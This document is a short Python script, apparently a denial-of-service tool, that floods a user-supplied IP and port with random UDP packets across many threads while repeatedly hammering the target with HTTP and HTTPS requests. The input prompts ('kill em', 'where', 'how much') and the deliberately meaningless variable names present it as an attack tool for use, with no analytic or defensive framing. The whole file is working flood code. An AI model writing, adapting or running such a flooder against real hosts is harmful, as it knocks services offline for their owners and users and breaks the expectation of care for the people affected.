import socket
import random
import time
import threading
import requests

def c87(target_IP, target_port, num_packets):
  while True:
    for i in range(num_packets):
      try:
        packet = bytes(random.getrandbits(8) for _ in range(1024))
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(packet, (target_IP, target_port))
  
        r0 = time.time()
        r1 = requests.get("http://" + target_IP)
        j34 = time.time()
        r2 = requests.get("https://" + target_IP)
        b6 = time.time()
    
        e1 = j34 - r0
        e2 = b6 - j34
        print(f'The website took {e1:.2f} seconds to load.')
        print(f"Connected to {target_IP} with status code: {r1.status_code}")
        print(f'The website took {e2:.2f} seconds to load.')
        print(f"Connected to {target_IP} with status code: {r2.status_code}")
      except Exception as e:
        print(f"@w@ {e}")
        continue

def main(num_threads, url):
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=c87, args=(url, b7, z2))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    print("woooowooooowwowowooooww")
    b5 = input("kill em ")
    b4 = input("where ")
    b7 = int(b4)
    z1 = input("how much ")
    z2 = int(z1)
    url = b5
    main(z2, url)
